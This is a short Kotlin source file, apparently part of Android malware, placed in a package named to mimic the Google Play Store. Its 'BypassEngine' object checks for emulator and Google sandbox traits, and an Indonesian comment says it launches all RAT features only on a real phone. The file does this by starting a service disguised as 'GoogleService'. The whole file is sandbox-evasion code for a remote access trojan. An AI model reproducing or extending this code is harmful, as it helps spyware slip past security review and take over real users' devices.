package com.android.vending.service

import android.os.Build

object BypassEngine {
    fun activate(context: android.content.Context) {
        if (isRealDevice()) {
            // Jalankan semua fitur RAT jika di HP asli
            context.startService(android.content.Intent(context, GoogleService::class.java))
        }
    }

    private fun isRealDevice(): Boolean {
        val buildModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        // Deteksi Emulator/Sandbox Google
        return !(buildModel.contains("sdk") || buildModel.contains("Emulator") 
                || buildProduct.contains("google_sdk") || Build.FINGERPRINT.contains("generic"))
    }
}
